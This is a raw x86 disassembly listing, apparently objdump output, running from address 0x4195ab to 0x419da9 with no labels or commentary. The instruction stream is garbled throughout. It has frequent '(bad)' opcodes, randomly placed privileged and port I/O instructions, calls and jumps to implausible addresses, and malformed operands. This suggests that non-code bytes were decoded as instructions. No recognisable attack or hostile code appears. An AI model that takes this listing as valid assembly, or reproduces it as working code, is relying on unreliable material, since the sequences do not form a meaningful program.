  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
